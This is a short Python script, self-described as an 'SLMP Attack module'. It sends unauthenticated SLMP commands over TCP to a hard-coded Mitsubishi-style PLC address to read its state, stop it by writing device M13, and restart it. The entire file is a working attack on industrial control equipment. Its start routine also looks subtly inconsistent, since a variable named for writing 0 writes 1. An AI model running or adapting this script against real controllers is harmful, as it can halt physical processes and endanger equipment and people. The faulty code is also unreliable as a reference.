import socket
import sys
import time

IP_PLC_FOR_STANDALONE = '192.168.127.32'
PORT_PLC = 8196
buffer_size = 1024
packet_header = {
    "subheader": "5000",
    "net": "00",
    "station": "FF",
    "module": "03FF",
    "multidrop": "00",
    "request_length": ""  # calculated
}


def build_payload(header, body):
    payload = ""
    header["request_length"] = request_len(body)
    for field in header.values():
        payload += field
    for field in body.values():
        payload += field
    return payload


def request_len(packet_body):
    payload = ""
    for field in packet_body.values():
        payload += field
    length = (hex(len(payload)).split('x')[-1]).upper()
    if len(length) == 1:
        length = "000" + length
    elif len(length) == 2:
        length = "00" + length
    elif len(length) == 3:
        length = "0" + length
    return length


def send_packet(packet, target):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = ""
    try:
        s.connect((target, PORT_PLC))
        result += "Payload: " + packet.decode('ascii') + " "
        s.send(packet)
        reply = s.recv(buffer_size)
        result += "Reply: " + str(reply) + " "
        s.close()
    except socket.error:
        result += "Connection error: " + str(sys.exc_info()[1])
    return result


def status_check(target):
    read_status = bytearray(build_payload(packet_header, {
                                        "monitoring_timer": "0010",
                                        "command": "0401",
                                        "subcommand": "0001",
                                        "device_code": "M*",
                                        "head_device": "000000",
                                        "points": "0010",
                                        "data": ""}
                                       ), 'ascii')
    return send_packet(read_status, target)


def stop(target):
    write_m13_1 = bytearray(build_payload(packet_header, {
                                           "monitoring_timer": "0010",
                                           "command": "1401",
                                           "subcommand": "0001",
                                           "device_code": "M*",
                                           "head_device": "000013",
                                           "points": "0001",
                                           "data": "1"}
                                          ), 'ascii')
    return send_packet(write_m13_1, target)


def start(target):
    write_m13_0 = bytearray(build_payload(packet_header, {
                                       "monitoring_timer": "0010",
                                       "command": "1401",
                                       "subcommand": "0001",
                                       "device_code": "M*",
                                       "head_device": "000013",
                                       "points": "0001",
                                       "data": "1"}
                                      ), 'ascii')
    write_m02_1 = bytearray(build_payload(packet_header, {
                                       "monitoring_timer": "0010",
                                       "command": "1401",
                                       "subcommand": "0000",
                                       "device_code": "M*",
                                       "head_device": "000002",
                                       "points": "0001",
                                       "data": "0001"}
                                      ), 'ascii')
    result = send_packet(write_m13_0, target)
    time.sleep(1)
    result += send_packet(write_m02_1, target)
    return result


if __name__ == "__main__":
    print("SLMP Attack module by Sever Sudakov")
    print(status_check(IP_PLC_FOR_STANDALONE))
    print(stop(IP_PLC_FOR_STANDALONE))
    print(start(IP_PLC_FOR_STANDALONE))
    print(status_check(IP_PLC_FOR_STANDALONE))
